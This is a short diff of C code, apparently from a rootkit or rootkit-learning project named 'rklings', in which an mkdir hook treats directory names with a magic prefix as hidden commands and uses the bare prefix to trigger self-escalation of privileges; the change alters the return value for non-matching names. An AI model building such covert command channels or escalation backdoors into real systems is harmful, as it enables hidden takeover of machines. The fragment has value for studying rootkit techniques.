@@ -37,7 +37,7 @@ RK_ON_MKDIR(name)
 
 	/* Must start with "rklings.e" */
 	if (strncmp(name, RK_CMD, RK_CMD_LEN) != 0)
-		return -ENOENT;
+		return 0;
 
 	/* "rklings.e" with no suffix: self-escalation */
 	if (name[RK_CMD_LEN] == '\0') {
